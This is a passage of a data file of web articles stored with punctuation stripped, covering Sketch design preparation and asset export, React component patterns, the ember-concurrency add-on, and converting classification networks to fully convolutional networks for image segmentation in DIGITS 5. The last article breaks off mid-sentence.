425,training-dataset/product/854.txt,product,5 things to do before starting your next design file in SketchGraduating from chef school and entering into the real world isn t as glamorous as you d think  so I ve gathered   You don t just grab your degree  throw on a chef s toque hat  and open a restaurant in a trendy part of town   Wouldn t that be nice   No  the majority of chefs join the culinary world preparing the mise en place  Don t speak French  Me neither  Mise en place means  everything in its place  and refers to the preparation and organization of the ingredients before service   You know how Rachael Ray always has those tiny bowls of pre portioned ingredients when she s doing one of her 30 minute meals which I swear actually takes at least an hour  Well  as it turns out  that s not too far off from what professional kitchens do to prepare for service  Look at this   Young greenhorn chefs get to the kitchen hours before service to chop every vegetable  trim every filet  and prepare all of the sauces  among many other duties   In doing so  they re enabling the restaurant to prepare exquisite dishes with multiple courses to feed your fat face and get you out the door in under 2 hours  If they waited until they received an order to prepare all of the ingredients  service would take hours  dishes would be inconsistent  and the kitchen would simply not be able to sustain itself   Product designers should always prepare their mise en place before diving into design  dinner service    Before you start designing dozens of screens and workflows  it s important to set yourself up for sustainable design success  Here are 5 tips for preparing your design mise en place   1  Set up typography and text styles  This first one is obvious  but it can be a real chore  There is no more direct way users will interact with and understand your product than through words  so it s important that we get this right   I like to give myself the widest range possible of text sizes and styles  so my typography sheet looks like this  I always create a dark version  too     Each style has 4 sub types   Default  usually 80 100  transparency    usually 80 100  transparency  Secondary  50 70  transparency    50 70  transparency  Disabled  20 40     20 40   Accent  usually my brand color   Why do I use transparency instead of hex values   It s a neat little trick to ensure that your text looks great over any background color  In the image below  the transparency  second line  looks much better than the grey  first line  because it has taken on the hue of the color below it  There are no tricks  the second line of text is the exact same in each color scenario  It s just the transparency working for you that makes them look like different text styles  All for the price of one  How convenient   I won t get into the mechanics of choosing good font sizes in this post  but check out Typography in Ten Minutes for a quick crash course   Lastly  it s imperative that you create a Sketch Text Style for each style you define  If you decide down the road that you want your  disabled  color to be 25  instead of 30   all you have to do is change it in one place and it will cascade across your document   Pro tip  Using slashes in your text style names  see above  will create little sub menus in your styles dropdown   2  Configure colors and object styles  There are 5 base colors that you should figure out before anything else   Base colors  Brand  This is your brand color pretty straightforward  This is your brand color pretty straightforward Black  Set a base black that you ll use for all type in your designs  I like to avoid pure black and instead create a black tinted with my brand color  or a complementary one   See the image below   State colors  Error  Some variant of red  This state lets users know when something has gone awry  Pure red is a little much  Tint it with yellow or blue to make it easier on the eyes   Some variant of red  This state lets users know when something has gone awry  Pure red is a little much  Tint it with yellow or blue to make it easier on the eyes  Warning  Some variant of yellow  This state lets users know when something hasn t yet gone awry  but could potentially lead to problems  Don t make this yellow too electric  mine is usually a little more orange so it s readable over white   Some variant of yellow  This state lets users know when something hasn t yet gone awry  but could potentially lead to problems  Don t make this yellow too electric  mine is usually a little more orange so it s readable over white  Success  Some variant of green  This state lets users know that everything is groovy  I prefer app colors to be a little cooler  so I ll make my green a little bluer   Why only 5 colors  I feel strongly that colors should be used very deliberately in a product  Don t make something purple just to make it purple  My designs are built in black and white UNLESS I m trying to call attention to something   Additional colors are appropriate for things like charts and graphs  but they should use different colors than your base state colors   Object styles  These are a little more difficult to set up front  but they re still great for saving time  Object styles are anything from card backgrounds to list item bounding boxes  Here s a sheet with some of my object styles   I use these styles whenever I m creating objects  and if I want to update the base style  I just come to this sheet and sync it across all of my pages  It s a tremendous time saver  especially after several months of designing screens for a client in a file with 97 screens  Mama mia   3  Create pages and art boards  This one is pretty easy  but it ll help you maintain your sanity  Decide up front how you want to organize your designs   By feature  In a food app  you might have one page set up for all  recipe  art boards  and a separate page for all  profile  art boards  In a food app  you might have one page set up for all  recipe  art boards  and a separate page for all  profile  art boards By user role  In the Medium app  you might have one page set up for all  reader  art boards  and a separate page set up for all  submitter  art boards  In the Medium app  you might have one page set up for all  reader  art boards  and a separate page set up for all  submitter  art boards By workflow  In the Uber app  you might have one page set up with all art boards in your  Ordering a car  workflow  and another one for  Adding a credit card  workflow  Any of the above are fine  but commit to something early and stick with it   Pro tip  If you re using InVision  using Pages to organize your art boards might eventually pay off if they start automatically creating sections for you based off of your page titles  That is  each page will be a section  and all art boards on that page will be in that section on InVision   4  Set up your grid system and layout  The grid system is so important that I ve talked about it before  But you re just going to have to listen to me talk about it again   All of these tips are about making things easier for you  and reducing the amount of decisions you have to make while you re designing   Setting up your grid system will make layout and positioning a very passive act you won t even have to think about how far apart things should be spaced because you know your grid system increments  and have even adjusted your Sketch nudge defaults to adhere to them   Here s a peek at the 8px base grid layout settings behind the screen above   Something to note when you re setting up your layout  Depending on your app layout  edge to edge versus floating   you might need to have separate layout guides on each page   Added bonus  Your developer friends are going to love you for setting up and adhering to this grid because every framework out there sits on top of a grid system like this   One final note  I don t personally set up rows in Sketch because it varies so much from page to page  Feel free to do this if you want  though   5  Import and symbolize branding assets  Almost done  Deep breath   The last thing to do is import any all branding assets  This could be as simple as a logo  or as big as a set of branded app icons  The important thing is that you convert each of these assets into symbols   Why   Well  put on your imagination pants and let s pretend you ve designed 75 screens with your logo and slogan in the navigation header  Marketing has decided that they want to ditch the slogan because apparently  Just Do It  has already been taken  and some large company is threatening to sue  How could I have missed that    Well  Danny the Designer goofed up and didn t symbolize his logo  So Danny the Designer has to go update it on 75 individual screens because they re being used in marketing materials  and legal needs that slogan removed   Don t be like Danny   In a stroke of genius  Sandy the Sketcher decided to symbolize the logo from the get go  She updated the base symbol in her style guide  then hit the sync button to update it across all of her pages  While Sandy is off sipping pi a coladas  Danny is sweating through dozens of pages updating logos   Be like Sandy   That s it  You ve now prepared your design mise en place and you re ready to start your design dinner service   This post was originally published on Medium   Read more about food and design,"[425 218 1077 887 564 1001 1344 69 319 1420 444]"
444,training-dataset/engineering/765.txt,engineering,10 React mini patterns   Hacker NoonHow about a picture  The below thing is the simplest form of this pattern   Like sending down a packet of chips and a walkie talkie to miners trapped underground   The one thing I d recommend to everyone new to React is to get your head around the pattern of passing information down  as objects  strings  etc   and passing methods down to allow child components to pass information back up   It s a long one  but it s a listicle so you can skip the boring ones  3  6  8  10    Or maybe you re not  There s only one way to find out   These are the sorts of things I would like to have heard about on day one  So if today is your day one with React  you re in luck   Over the last few years  I ve worked on a handful of decent sized React projects  and many  many pint sized ones  Throughout this magical journey  a number of patterns have come up that I find myself repeating again and again   Parent on the left  child on the right  You can think of the two props that connect these components as allowing information to flow in either direction between the two   The prop called items is passing data down into the child component  The prop called deleteItem is giving the child component a way to send some information back up into the parent   hey  delete this item     That s not really a pattern   The rest are patterns  I promise    2 Fixing HTML s inputs  One of the great things about React  and web components in general  is that you get to iron out the kinks if something in html doesn t work the way you want   If you think about the different elements that allow for user input  do it   you will soon see that the naming of these elements is nonsensical  bordering on reckless   If I m building a site that will have a lot of user inputs  one of the first things I do is fix this   It s not purely cosmetic though  there are more improvements to be had   Inputs should return a value via an onChange method  not a JavaScript Event instance  shouldn t they   method  not a JavaScript instance  shouldn t they  You can go a step further and ensure that the data type returned in onChange matches the type passed in  If the typeof props value is number   then convert e target value back to a number before sending the data out again   matches the type passed in  If the is   then convert back to a number before sending the data out again  A set of radio buttons is functionally the same thing as a  select    right  It s messed up to treat them in a completely different manner when the only difference is the UI  Maybe for your app it makes sense to have a single  PickOneFromMany    component and pass either ui  radio  or ui  dropDown     The point is not to do it like I do it  The point is to make them your own   you don t need to keep working with the somewhat ass about nature of HTML s user input elements    3 Binding labels to inputs with unique IDs  On the topic of inputs  if you care about your users  you ll bind your  label  elements to your  input  s via an id   for combo   But you don t want to think of some clever and unique id for every input you define  who s got time for that  I don t know about you but I ve got goat videos to watch    Frequent flyer tip  if you have a screaming child on your flight  close your eyes and pretend you re watching a video on YouTube of goats that sound like humans  Annoying becomes hilarious    Back to it  You could generate a random ID for each input label pair  but then your client rendered HTML won t match your server rendered HTML  Checksum error  That s no good   So  instead you can create a little module that gives an incrementing ID  and use that in an Input component like so   Obviously it makes more sense when the input isn t inside the label   If getNextId   simply increments a number every time it s called  then when rendering on the server  the number would keep going up and up  eventually reaching infinity  So you ll want to reset the number each time you render the app  for each network request    You can do this at the entry point to your app  with a simple resetId   or whatever name you think is best   With all that taken into account  your super fancy module might look something like this    4 Controlling CSS with props  When you want to apply different CSS in different instances  e g   primary  and  secondary  buttons  you can pass in props to control which CSS to apply   This seems super simple on the surface  but let me assure you there are a lot of wrong ways to do this  I ve tried them all     There are   I reckon   three distinct ways in which you can control the CSS applied to a component   Using themes  For grouping a number of CSS declarations together  you can use the idea of  themes   for example primary or secondary button    Button theme  secondary  Hello  Button   Do your best to only require one theme per component   Using flags  Maybe some of your buttons have rounded corners  but this doesn t correspond directly with the themes you have defined   In this case you can either sit your designer down and have the consistency talk  or create a boolean prop which might look a little something like this    Button theme  secondary  rounded Hello  Button   Just like HTML s binary attributes  you don t need to do rounded  true     Setting values  In some cases you might want to pass in the value of a CSS property directly  in the component you would set it as an inline style     Icon width  25  height  25  type  search      An example  Imagine you re creating a link component  You go through your site s designs and work out that there are three distinct themes  and that sometimes they have an underline  sometimes they don t   Here s how I would design that component   And the CSS   You may have noticed the awkward double negative for link  no underline    Story time  I used to think writing fewer lines of CSS was the goal  but it s not  I d rather have some double negatives and multi selector rulesets if it means the styles are applied in a nice layered way   I m sure I ve said it before but the hardest thing about scaling a website is the CSS  JavaScript is easy  but with CSS you pay for your sins   once you ve started a mess  it s not easy to back out of   True fact  fighting CSS specificity is the number one cause of death among web developers  If you re on a big computer  check out the CSS for the little notification icon in medium s top nav   If you re not  or you re lazy  just guess how many CSS rules are combined to make this round circle with a number in it   Twenty three rules   That s not including the styles inherited from eleven other rules   The line height alone is overridden nine times   If line height was a cat it would be dead by now   This cannot be pleasant to maintain   With React we can do better  We can thoughtfully design which classes are applied to our components  We can remove global resets and move it all inside our Button scss   We can remove all reliance on specificity and ordering of files   Side note  I dream of a day when we will be able to tell browsers that we don t want their opinion about style at all    user agent styles  none whatsoever    make it happen  vendors   Edit  a clever chap in the comments has pointed out that all  unset may cure what ails me     5 The switching component  A switching component is a component that renders one of many components   This may be a  Page  component that displays one of many pages  Or tabs in a tab set  or different modals in a modal component   I used to do this with switch statements  then progressed to actually passing in the component I wanted rendered  Then moved on to exporting references to the components from the component itself  as named exports  then as properties on the component    All terrible ideas   The potentially terrible approach that I have settled on is to use an object to map prop values to components   The keys of the PAGES object can be used in the prop types to catch dev time errors   Then of course we would use this like  Page page  home        If you replace the keys home   about and user with      about   and  user   you ve got yourself half a router    Future post idea  removing react router      6 Reaching into a component  If you re looking for an easy way to please your users  add autofocus to the input that they are most likely to type into when coming to a page  It really is that easy   Perhaps you have a sign in form and   being the UX champ that you are   you want to put that little blinking cursor in the  user name  field   But oh no  the form shows in a modal when the user clicks  sign in   and the autofocus attribute only applies to page load   Whatever will you do   You ll programmatically focus the element  that s what  Here you may be tempted to give the input an id and type document getElementById  user name input   focus      This works  but is not The Correct Way  The fewer things you have in your app that rely on two strings matching  the better   Luckily  there is a very easy way to do this  properly    Boom  an input component with a focus   method that focuses the HTML element   In the parent component  we can get a reference to the Input component and call its focus   method   Note that when you use ref on a component  it s a reference to the component  not the underlying element   so you have access to its methods    7 Almost components  Let s say you re building a component that lets you search for people  As you type  you see a list of names and photos of potential matches  Something like this    I m searching for political satirists because I  like everyone  am super interested in what other people think about politics    When designing this component  you may think to yourself  is each item in that list it s own SearchSuggestion component  It s really only a few lines of HTML and CSS  so maybe not  But I was once told  if in doubt  create another component    Oh my  this is quite the dilly of a pickle  isn t it   If I was making this  I would not have a separate component  Instead  just a renderSearchSuggestion method that returned the appropriate DOM for each entry  I can then generate the results like   If things get more complex or you want to use this component elsewhere  you should be able to copy paste the code out into a new component   Don t prematurely componentize  Components aren t like teaspoons  you can have too many   What I am not saying   take something that you think should be a component  and make it part of the parent component    What I am saying   take something that you don t think should be a component  and make it a bit more like its own component  if it can be      8 Components for formatting text  When I first started with React I thought of components as big things  a way of grouping structural chunks of DOM  But components work just as well as a way to apply formatting   Here s a  Price  component that takes a number and returns a pretty string  with or without decimals and a     sign   As you can see I m using the powerful Intl string formatting library  here s a link to their website   I should point out  before some punk does  that this is not a saving in lines of code  You could just as easily use a function to do this   Of course components are just functions with different shaped brackets    It s less code  but to my eye  not quite as nice   Note that I m not checking that I got a valid number in any of the above  That s because     9 The store is the component s servant  I have probably written this thousands of times   if  props user signInStatus     SIGN_IN_STATUSES SIGNED_IN       I ve been told that I exaggerate  like  a gazillion times    Quite recently I have decided that if I m doing a check like this  I m doing it wrong  I want to just ask  is the user signed in    not  is the sign in status of the user equal to signed in    My components have enough going on in their lives  they shouldn t have to worry their pretty little heads over such matters  Nor should they have to worry that a price isn t being sent as a number  or a boolean as the word  true    For you see  if the data in your store is designed to match your components  your components will be much simpler  And I ve said it before  complexity is where the bugs hide  The less complexity you have in your components  the lower the chance of bugs   But the complexity has to go somewhere  doesn t it   My suggestion is this   Work out the general structure of your components and the data they will require Design your store to support those requirements Do whatever you need to do to your incoming data to make it fit into the store   For this last point  I recommend a single module that does all the massaging of incoming data  oh la la   Renaming props  casting strings to numbers  objects into arrays  date strings to date objects  whatever   Do it all in the one place  and unit test the crap out of it   If you re rockin  a react redux setup  you might then do something like this in an action creator that fetches search results   Your components will thank you for it    10 Importing components without relative paths  Wouldn t it be sweet if instead of doing this   import Button from              Button Button jsx    import Icon from              Icon Icon jsx    import Footer from        Footer Footer jsx    You could just do this   import  Button  Icon  Footer  from  Components    Well in theory you can   Create a single index js somewhere that exports references each of your components  somewhere that exports references each of your components Use Webpack s resolve alias to redirect Components to that index file  I hadn t done this before  and planned to convert one of my existing apps for this post  then lie and tell you I totes do it all the time   But as I wrote the code I came to realise that this is a bad idea  for three reasons   It seems to be broken in Webpack 2  It s an eslint error because Components won t be in node_modules   If you use a good IDE  it will know things about your components  You will get clever warnings about not supplying required props  the ability to cmd   ctrl  click to open that component s file  Things of that nature   If you do the above  your IDE will no longer know where to find that component and you ll lose those smarts   Thanks  WebStorm   Edit  matthew hsiung has a solution for the eslint and WebStorm issues in this comment   Wrap up  That s the lot of them  I m quite sure I ll look at this in a year and wince  Perhaps you ll do it today  Perhaps you ll share something that has served you well   Oh and I ve decided I don t care if you click the little green heart or not  I WILL NOT BE DEFINED BY AN INTERNET METRIC,"[444 248 996 319 1395 629 400 28 1305 820 564]"
454,training-dataset/engineering/397.txt,engineering,ember concurrency  or  How I Learned to Stop Worrying and Love the TaskFig  5  By storing previously successful tasks  we can show data updates  Here  we leave a route and re enter it to trigger a data update   Benefits for both parties in a web app  A large web app is successful if users enjoy navigating it and if developers enjoy building it  While ember concurrency was written with the intention of reducing boilerplate code and enforcing logical boundaries  our full scale adoption of the add on has made the user experience much smoother  We have built an app that demonstrates the benefits of single page applications  route transitions feel extremely speedy because the model hook returns simple objects without pausing to resolve promises  and the user receives instant visual feedback about network operations in response to clicks  Pages that retrieve data from multiple sources can display it in a progressive way and minimize idle time where the user cannot interact with the page  Responsive filter based interfaces reflect data updates in a clear and dynamic way   Many JavaScript developers  myself included  can relate to the frustration of staring at a promise chain or callback functions to understand a particular execution flow  JavaScript s powerful concurrency model and event loop become very cumbersome to manage in complex apps  where multiple components and routes multiply the unpredictability of user interaction and network latency   ember concurrency s mission to improve developer experience has been a great success  When futuristic ES6 features like generator functions were introduced  many developers nodded their head and shrugged  it seemed like a different way to execute the same asynchronous operations  with no obvious breakthrough implementation  A few years later  ember concurrency has established itself as one of the most dynamic applications of generator functions  We now write readable code without convoluted promise callbacks  The browser uses an event loop to handle asynchrony  but our brains have an easier time understanding logic that looks synchronous  Like other modern JavaScript features such as async await  generator functions abstract the complexity of the run loop into structured  linear code that mimics a flat timeline  Developers like us are the big winners  as our code is more readable and maintainable   A glimpse into the future of JavaScript  Tasks reflect a shift from the philosophy of promise based frameworks  whereas promises ensure that specific code will be run  the unpredictability of the web is such that making future guarantees behind time based operations is dangerous  Tasks that are bound to components offer a much more reassuring guarantee  assuring us that code will be executed as long as the component is active and the task is not explicitly canceled  We are much more comfortable and engaged writing code because we know that an add on is abstracting out the boilerplate logic   ember concurrency is still not perfect  and our work in internal tools has shielded us from the few downsides of using it  By assuming that our users use modern browsers on a fast connection  we could afford to take a flyer on a library that initially required heavy Babel polyfills  though this is no longer the case  and did not provide easy server side rendering support with Ember FastBoot  Several months later  the add on feels more mature  and we have been so happy with it that we have entirely eradicated promises from our code base  By going at the heart of issues like developer convenience and concurrency management  it is one of the best concrete applications of futuristic JavaScript features  Give it a shot  we guarantee it ll change the way you write Ember   Acknowledgements  Warm thanks to Alex Matchneer for building this truly game changing add on and helping me understand the motivations behind it  to Josh Lawrence for his willingness to take calculated risks in our big project  and to the rest of the Centralized Release Tool team for their tremendous work on highlighting the power of ember concurrency,"[329 1267 454 629 400 28 1305 1144 820 248 223]"
564,training-dataset/product/1122.txt,product,Sketch for front end developers  part 2If you re just joining us  we re taking a look at Sketch through a front end lens  In part 1  we covered the basic terms and skills that ll let you poke around inside of Sketch   Now we re going to take a look at the really important stuff  mainly  getting stuff out of Sketch   Exporting assets  When I start a build  one thing I find myself immediately doing is pulling asset after asset out of the design file  Images  illustrations  icons they all need to be selectively cut out of the document for placement into your front end build   And Sketch gives us tons of ways to do that  The way it manages exports is one of the main reasons I use Sketch  There are a number of ways to makes things exportable  all with specific use cases   Slices are the most traditional way of grabbing something out of the document  You can use the Slice tool  press S key or Insert   Slice  to manually select regions of the canvas you d like to export   Layers and groups can be exported by selecting them in the palette and using the Make Exportable dialog in the bottom right of your Sketch interface  It s a great way to quickly isolate assets in a complex document   Artboards can be exported whole  by selecting it from the canvas and using the Make Exportable dialog  I usually use artboard export to share entire screens  either with my team in Slack or into a prototype with InVision   As you mark things for export  you ll also able be able to select the file type and the export file size   2x   3x  etc    The best part  It s stackable  Which means you can grab that icon in all 4 sizes in 1 swing   Once an asset is marked for export  it ll show up in the Export menu  top right in Sketch interface   as well as travel with the file  Meaning  if you share the file with a team member  all the assets will be ready to roll when the file is re opened   Recently the team behind Sketch released 2 official plugins targeted at the export process  SVGO Compressor and Sketch Image Compressor  and both help you minimize the size of your exports  while using trusty open source libraries   There s also a command line tool  but we ll talk about that a bit later   Making a Style Library in Sketch  The phrase  handoff  has recently fallen out of style  and with good reason  We re getting rid of that old way of working where the designers design and then separately the developers develop   As the lines between design and dev blur  it s more important than ever to document  document  document  Keeping track of the decisions being made leads to a more consistent build  less last minute rework  and smoother teamwork all the way through   Related  Learn how to switch to Sketch  While there are dozens of ways to build out a style guide  I tend to opt for something automated  out of both laziness and desire for accuracy   My favorite is Craft Library  which gives you some super handy tools for organizing and documenting your design decisions  and soon to be code decisions    Library has a couple ways of indexing styles  Your Document Styles are a complete inventory of styles and colors and font sizes inside your document every single one  Your Shared Library is a bit more choosy  and you can individually decide what gets added to it  including symbols and groups you can define  Think of it a bit more like a public repo where you only put the stuff you re sure about and ready to share   I d imagine at this point that most developers in the crowd get how awesome this is  but here are a few more things to keep in mind   Inventory everything  See every single color  font  and more in a single place  It s a great place to start before you write any code  and it s just as helpful when you re deep into the build  Even better  seeing all the styles at once is also a great way to cut some fat before it gets to code  as it makes it easy to spot duplicate and near duplicate styles  which happen to even the best designers    Share your style guide  Craft makes it easy to share a style guide between team members  which means it s easy for designers and developers to work together on this  Regardless of who creates the guide  review it together and discuss the finer details   Consider symbols part of your guide  I love considering the symbols in the Sketch document part of the modular front end build I m creating  If it s reusable in Sketch  it s a good candidate to be reusable in my code   In fact  with Craft Library  you can easily add symbols and other elements into named buckets for easy sharing  One designer can make the card layout  another can fill it and place it into the layout  and then you can code it   A good style library can get rid of one of the worst things during a build  surprises  While surprises might be good for birthday parties  during a tight build they re absolutely the worst   Pulling CSS from Sketch  One of the best ways I can explain what I do as a front end developer is to call myself a translator  Open the design file  look at the elements  determine the size color position  translate this in my head into HTML and CSS  save  rinse  repeat    This thing is blue and is this big and has this kind of font    It s not exactly hard  but the repetition can be crushing  It s a lot of looking  computing  committing   Then one day I noticed Sketch had a Copy CSS option in the right click menu   Let s check out a quick example  in the form of this button  Waaaay back in the day  this might have been an image I sliced out of Photoshop  Now I can grab the CSS and make the button with code only   When I copy CSS from this button group  it brings me the styling of button and the styling of the text inside  It also adds the layer names to help you keep things straight   While the CSS rules provided are generally spot on  there s a few things you might wanna consider   Speed up your workflow don t replace it  The CSS generated by Sketch is a big helper  not a one stop shop  It s not going to code your layout for you  Think of it as a way to quickly grab verified style information  not a WYSIWYG editor   Add your own browser prefixes  The CSS code you copy from Sketch might need browser prefixes  fancy things like box shadow and such   so make sure you add them yourself or use a preprocessor that takes care of it for you   Test on your target screen  Font sizes and border settings have a way of looking different on different screen sizes and resolutions  and depending on how your Sketch canvas is set up   Before you take any of the numbers Sketch produces as fact  check it on a real screen in a real browser   No Sketch app  No problem   For years now  one of the biggest problems with sending design files around on a team is that not everyone has the software to open them  Remember getting a Quark file  Or something locked to Illustrator 11 when you ve only got 10   Luckily that trend has been changing lately  and there are now a bunch of ways to explore a Sketch doc without even having the app installed  Let s run through a couple   Open a Sketch file without Sketch app using InVision  When you add a Sketch document to InVision  free  sign up here   all the artboards and exportable assets are automatically added to your project   On top of that  you can use Inspect  currently in enterprise beta  to actually navigate around the design  measurements  colors  exporting assets  and more   Beside simply seeing what s in the file  you can also use InVision to create a working prototype from the Sketch file  which you can then discuss with your designers and team to make sure everyone is on the same page   Command line master  Check out SketchTool  If you don t have Sketch installed  you can still use this nifty command line tool from Bohemian Coding  the makers of Sketch  to access the inside of that Sketch document  You can view file info  export assets  and a few other tricks  Really enterprising developers could even chain this into their build process  example  grab the latest icons from the design before you bundle an icon font   But that s a story for another day   And there are more tools and integrations and plugins coming out all the time  So  even if you don t have Sketch  there s no need to freak out when someone sends you a Sketch file  In fact  you might owe that designer a high five   Let s build   Moving into new software is always scary  Heck  I toyed with Sketch for almost a year before I really committed  I hope this article has shed some light into the new  and familiar  paradigms inside Sketch  and that you master them in no time   It s a whole new world  We re waiting for you   Did you miss part 1 of this series   Go and read Sketch for front end developers  part 1,"[564 1344 887 69 1001 319 1175 1077 425 1275 444]"
599,training-dataset/engineering/539.txt,engineering,Image Segmentation Using DIGITS 5Today we re excited to announce NVIDIA DIGITS 5  DIGITS 5 comes with a number of new features  two of which are of particular interest for this post   a fully integrated segmentation workflow  allowing you to create image segmentation datasets and visualize the output of a segmentation network  and the DIGITS model store  a public online repository from which you can download network descriptions and pre trained models   In this post I will explore the subject of image segmentation  I ll use DIGITS 5 to teach a neural network to recognize and locate cars  pedestrians  road signs and a variety of other urban objects in synthetic images from the SYNTHIA dataset   Figure 1 shows a preview of what you will learn to do in this post   From Image Classification to Image Segmentation  Suppose you want to design image understanding software for self driving cars  Chances are you ve heard about Alexnet  1   GoogLeNet  2   VGG 16  3  and other image classification neural network architectures  so you might want to start from there  Image classification is the process by which a computer program is able to tell you that a picture of a dog is a picture of a dog   The output of an image classification model is a discrete probability distribution  one number between 0 and 1 a probability for each class the model is trained to recognise  Figure 2 illustrates an example classification of an image of a cat using Alexnet in DIGITS  The result is spectacularly good  remember that Alexnet was trained on 1000 different classes of objects from categories including animals  musical instruments  vegetables  vehicles and many others  I find it humbling to see that with over 99  confidence  a machine is able to correctly classify the subject of the image as feline  I  for one  would be at a loss to tell whether that particular cat is an Egyptian  tabby or tiger cat   But what happens if you classify an image of a cat and a dog  Common sense might lead you to believe that the neural network would assign an equal share of the probability distribution to our two favorite pet species  Let s try it  Figure 3 shows the outcome  There is a mix of cats and dogs in the predictions  but AlexNet doesn t deliver the hoped for 50 50 split  In the middle picture there are in fact no cats within the Top 5 predictions  This is disappointing  but on the other hand Alexnet was trained on a  small  world of 1 2 million images in which there is only ever one object to see  so one can t reasonably expect it to perform well in the presence of multiple objects   Another limitation of classification networks is their inability to tell the location of objects in images  Again  this is understandable  considering that they were not trained to do this  but this is nonetheless a major hindrance in computer vision  if a self driving car is unable to determine the location of the road it will probably not travel a long way   Image segmentation addresses some of these shortcomings  Instead of predicting a single probability distribution for the whole image  the image is divided into a number of blocks and each block is assigned its own probability distribution  In the most common embodiment  images are divided down to pixel level and each pixel is classified  for every pixel in the image  the network is trained to predict which class that particular pixel is part of  This allows the network to not only identify several object classes in each image  but also to determine the location of objects  Image segmentation typically generates a label image the same size as the input whose pixels are color coded according to their classes  Figure 4 shows an example that segments four different classes in a single image  table  chair  sofa and potted plant   In a further refinement of image segmentation named Instance aware Image Segmentation  IAIS  the network learns to identify the contours of every object in the image  This is particularly useful in applications that must be able to uniquely identify every occurrence of a class  even when there is no clear separation between them  such as in Figure 5  the middle image is the image segmentation label  while the rightmost image is the IAIS label  notice how the color codes uniquely identify each person   I won t go deeper into the subject of IAIS and I will focus on instance segmentation but I encourage you to check out Facebook s SharpMask work on IAIS   Let s look at how we can design a network that is capable of segmenting an image   From CNN to FCN  The previous section distinguished image classification models that make one probability distribution prediction per image from image segmentation models that predict one probability distribution per pixel  In principle  this sounds rather similar and you might expect the same techniques to apply to both problems  After all  it merely adds a spatial dimension to the problem  In this post I will show you that just a few minor adjustments are enough to turn a classification neural network into a semantic segmentation neural network  I ll employ techniques first introduced in this paper  4   which I ll refer to as the FCN paper   Before I get started  some terminology  I will refer to typical classification networks like Alexnet as Convolutional Neural Networks  CNN   This is slightly abusive since convolutional neural networks serve many purpose besides image classification but it is a common approximation   In a CNN it is common practice to split the network into two parts in the first part  the feature extractor  the data goes through several convolutional layers to extract progressively more complex and abstract features  Convolutional layers are typically interspersed with non linear transfer functions and pooling layers  Each convolutional layer can be seen as a set of image filters that trigger a high response on a particular pattern  For example  Figure 6 shows a representation of the filters from the first convolutional layer in Alexnet and the activations  the outputs  on a dummy image that contains simple shapes  amusingly  AlexNet classifies the image as a wall clock    Those filters trigger a high response on shapes like horizontal and vertical edges and corners  For instance  have a look at the filter at the bottom left corner which looks like black and white vertical stripes  Now look at the corresponding activations and the high response on vertical lines  Similarly  the next filter immediately at the right shows a high response on oblique lines  Further convolutional layers down the network will be able to trigger a high response on more elaborate shapes like polygons and eventually learn to detect textures and various constituents of natural objects  In a convolutional layer  every output is computed by applying each filter to a window  also known as the receptive field  in the input  sliding the window by the layer stride until the full input has been processed  The receptive field has the same size as the filters  See Figure 7 for an illustration of this behavior  Note that the input window spans across all channels of the input image   In the second and final part of a CNN  the classifier consists of a number of fully connected layers  the first of which receives its inputs from the feature extractor  These layers learn complex relationships between features to endow the network with a high level understanding of the image contents  For example the presence of big eyes and fur might have the network lean towards a cat  How exactly the network makes sense of these features is somewhat magical and another trait of the pure beauty of deep learning  This lack of explainability is sometimes criticized but it is not unlike the way the human brain functions  would you be able to explain how you know that an image of a cat is not an image of a dog   Fully Convolutional Networks  FCN   as their name implies  consist of only convolutional layers and the occasional non parametric layers mentioned above  How can eliminating fully connected layers create a seemingly more powerful model  To answer this question let s ponder another   The question is  what is the difference between a fully connected layer and a convolutional layer  Well that s simple  in a fully connected layer  every output neuron computes a weighted sum of the values in the input  In contrast  in a convolutional layer  every filter computes a weighted sum of the values in the receptive field  Wait  isn t that exactly the same thing  Yes  but only if the input to the layer has the same size as the receptive field  If the input is larger than the receptive field then the convolutional layer slides its input window and computes another weighted sum  This process repeats until the input image has been scanned left to right  top to bottom  In the end  each filter generates a matrix of activations  each such matrix is called a feature map   This provides a clue  to replace a fully connected layer with an equivalent convolutional layer  just set the size of the filters to the size of the input to the layer  and use as many filters as there are neurons in the fully connected layer  I ll demonstrate this on the first fully connected layer in Alexnet   fc6    see Figure 8 for a DIGITS visualization of the layers of interest  You can see that fc6 receives its input from pool5 and the shape of the input is a 256 channel 6 6 image  Besides  the activations at fc6 are a 4096 long vector  which means that fc6 has 4096 output neurons  It follows that if I want to replace fc6 with an equivalent convolutional layer  all I have to do is set the filter size to 6 6 and the number of output feature maps to 4096  As a small digression  how many trainable parameters do you think this layer would have  For every filter there is one bias term plus one weight per number in the receptive field  The receptive field has a depth of 256 and a size of 6 6 therefore there are 256x6x6 1 9217 parameters per filter  Since there are 4096 filters  the total number of parameters for this layer is 37 752 832  That is exactly the number of parameters that DIGITS says fc6 has  All is well so far   In practice  Replacing the layer is simple  If you are using Caffe  just replace the definition on the left in Table 1 with the definition on the right   Table 1  Left  fc6 definition  Right  equivalent conv6 definition with a kernel size of 6 because the input to fc6 is a 6 6 image patch  layer   name   fc6  type   InnerProduct  bottom   pool5  top   fc6  inner_product_param   num_output  4096     layer   name   conv6  type   Convolution  bottom   pool5  top   conv6  convolution_param   num_output  4096 kernel_size  6      Armed with this knowledge  you can now proceed to converting all the fully connected layers in Alexnet with their corresponding convolutional layers  Note that you don t have to use DIGITS to figure out the shapes of the input to those layers  you could calculate them manually  As fun as that may sound  I assure you that you will run out of patience if you need to do this for the 16 layers  plus intervening pooling layers  in VGG 16  Not to mention the fact that you will inevitably lose the scratchpad you used to scribble your notes  Besides  as a Deep Learning fan  you should be comfortable with the idea of letting a machine do the work for you  So let DIGITS do the work for you   The resulting FCN has exactly the same number of learnable parameters  the same expressivity and the same computational complexity as the base CNN  Given the same input  it will generate the same output  You might wonder  why go through the trouble of converting the model  Well   convolutionalizing  the base CNN introduces a great amount of flexibility  The model is no longer constrained to operate on a fixed input size  224 224 pixels in Alexnet   It can process larger images by scanning through the input as if sliding a window  and instead of producing a single probability distribution for the whole input  the model generates one per 224 224 window  The output of the network is a tensor with shape KxHxW where K is the number of classes  H is the number of sliding windows along the vertical axis and W is the number of sliding windows along the horizontal axis   A note on computational efficiency  in theory you could implement the sliding window naively by repeatedly selecting patches of an image and feeding them to a CNN for processing  In practice  this would be computationally very inefficient  as you slide the window incrementally  there is only a small number of new pixels to see at each step  Yet  each patch would need to be fully processed by the CNN  even in the presence of a large overlap between successive patches  You would therefore end up processing each pixel many times  In an FCN  since those computations are all happening within the network  only the minimum number of operations gets to execute so the whole process is orders of magnitude faster   In summary  that brings us to our first milestone  adding two spatial dimensions to the 